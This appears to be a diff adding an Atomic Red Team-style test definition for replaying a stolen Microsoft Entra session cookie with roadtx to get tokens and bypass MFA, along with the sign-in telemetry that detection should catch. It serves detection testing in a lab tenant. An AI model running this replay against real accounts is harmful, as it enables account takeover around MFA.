@@ -1,0 +1,62 @@
+attack_technique: T1539
+display_name: "AiTM – Steal Session Cookie via Reverse Proxy (EvilGinx-style)"
+atomic_tests:
+  - name: "Cookie replay via roadtx"
+    auto_generated_guid: b2c3d4e5-f6a7-8901-bcde-f12345678901
+    description: |
+      Replays a stolen session cookie to authenticate without credentials or MFA.
+      Wraps roadtx to inject the captured cookie and mint a new access token.
+      This is the core post-phishing step in AiTM kits (Tycoon, Mamba, EvilProxy).
+    supported_platforms:
+      - windows
+      - linux
+      - macos
+    input_arguments:
+      session_cookie:
+        description: "Captured session cookie value (ESTSAUTH or ESTSAUTHPERSISTENT)."
+        type: String
+        default: "PLACEHOLDER_STOLEN_COOKIE"
+      tenant_id:
+        description: "Entra tenant ID of the lab tenant."
+        type: String
+        default: "00000000-0000-0000-0000-000000000000"
+      resource:
+        description: "Target resource URI for the replayed session."
+        type: String
+        default: "https://graph.microsoft.com"
+      token_output_path:
+        description: "Path to write the resulting token cache file."
+        type: Path
+        default: "#{token_cache_path}"
+    executor:
+      name: powershell
+      command: |
+        roadtx getcookies `
+          --cookie '#{session_cookie}' `
+          --tenant '#{tenant_id}' `
+          --resource '#{resource}' `
+          --tokenfile '#{token_output_path}'
+    cleanup_command: |
+      if (Test-Path -LiteralPath '#{token_output_path}') {
+          Remove-Item -LiteralPath '#{token_output_path}' -Force
+      }
+    references:
+      - "https://aadinternals.com/post/aitm/"
+      - "https://dirkjanm.io/phishing-for-microsoft-entra-primary-refresh-tokens/"
+    auth_profile: "cookie-replay"
+    defense_evasion: "MFA bypass via replayed session cookie; no credentials presented"
+    requires_token: false
+    expected_telemetry:
+      - source: entra_signin
+        match:
+          authenticationProtocol: "none"
+          clientAppUsed: "Browser"
+        within_minutes: 10
+      - source: ual
+        match:
+          Operations: "UserLoggedIn"
+          AuthenticationType: "Cookie"
+        within_minutes: 15
+    exercises_chokepoint:
+      id: "DC-AUTH-002"
+      url: "https://detectionchokepoints.com/auth/cookie-replay"
